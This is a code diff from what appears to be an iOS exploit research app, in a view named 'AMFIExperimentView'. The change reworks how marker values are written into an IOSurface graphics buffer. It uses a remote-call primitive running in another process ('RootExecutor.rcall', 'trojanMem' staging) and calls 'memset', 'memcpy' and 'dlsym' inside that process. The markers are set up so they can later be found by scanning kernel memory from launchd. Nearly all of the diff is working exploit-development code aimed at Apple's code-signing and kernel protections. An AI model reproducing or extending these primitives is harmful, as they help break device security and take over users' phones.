@@ -2493,18 +2493,56 @@ struct AMFIExperimentView: View {
         detail += "Size: 64KB (0x10000)\n"
         
         // Write unique marker pattern every 4KB (page boundary)
-        // Marker: 0xDSPL01T_PHYS_xx (unique per page)
+        // Use memset + direct write via RemoteCall (not pointer subscript)
         let markerBase: UInt64 = 0xD5B1017B_00000000  // "DSPLOIT" + page index
+        
+        // First: zero the surface via memset to ensure it's paged in
+        RootExecutor.rcall(sb, "memset", gfxBase, 0, 0x10000)
+        
+        // Now write markers using remote_write (more reliable than subscript)
         for page in 0..<16 {
             let marker = markerBase | UInt64(page)
             let offset = UInt64(page) * 0x1000
-            sb[gfxBase + offset].setValue64(marker)
-            sb[gfxBase + offset + 8].setValue64(0xCAFEBABE_DEADBEEF)
+            let writeAddr = gfxBase + offset
+            // Write 8 bytes at a time via trojanMem staging
+            sb[sbMem + 0x3800].setValue64(marker)
+            sb[sbMem + 0x3808].setValue64(0xCAFEBABE_DEADBEEF)
+            RootExecutor.rcall(sb, "memcpy", writeAddr, sbMem + 0x3800, 16)
         }
         
-        // Verify markers written
-        let verify = sb[gfxBase].value64()
-        detail += "Marker written: 0x\(String(format: "%llx", verify))\n\n"
+        // Verify markers written (read via memcpy to trojanMem)
+        RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
+        let verify = sb[sbMem + 0x3900].value64()
+        detail += "Marker written: 0x\(String(format: "%llx", verify))\n"
+        if verify == markerBase {
+            detail += "MARKERS CONFIRMED!\n\n"
+        } else {
+            detail += "Marker verify: expected 0x\(String(format: "%llx", markerBase)), got 0x\(String(format: "%llx", verify))\n"
+            detail += "Trying IOSurfacePrefetchPages first...\n"
+            let ioPrefetch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfacePrefetchPages"))
+            if ioPrefetch != 0 {
+                RootExecutor.rcall(sb, "IOSurfacePrefetchPages", gfxSurface)
+                // Retry write
+                RootExecutor.rcall(sb, "memset", gfxBase, 0x41, 16)
+                RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
+                let verify2 = sb[sbMem + 0x3900].value64()
+                detail += "After prefetch+write: 0x\(String(format: "%llx", verify2))\n"
+                if verify2 != 0 {
+                    // Now write real markers
+                    for page in 0..<16 {
+                        let marker = markerBase | UInt64(page)
+                        let offset = UInt64(page) * 0x1000
+                        sb[sbMem + 0x3800].setValue64(marker)
+                        sb[sbMem + 0x3808].setValue64(0xCAFEBABE_DEADBEEF)
+                        RootExecutor.rcall(sb, "memcpy", gfxBase + offset, sbMem + 0x3800, 16)
+                    }
+                    RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
+                    let verify3 = sb[sbMem + 0x3900].value64()
+                    detail += "Final marker: 0x\(String(format: "%llx", verify3))\n"
+                }
+            }
+            detail += "\n"
+        }
         
         // Step 2: From launchd context, scan kernel memory for our marker
         detail += "=== Step 2: Scan kernel memory for marker ===\n"
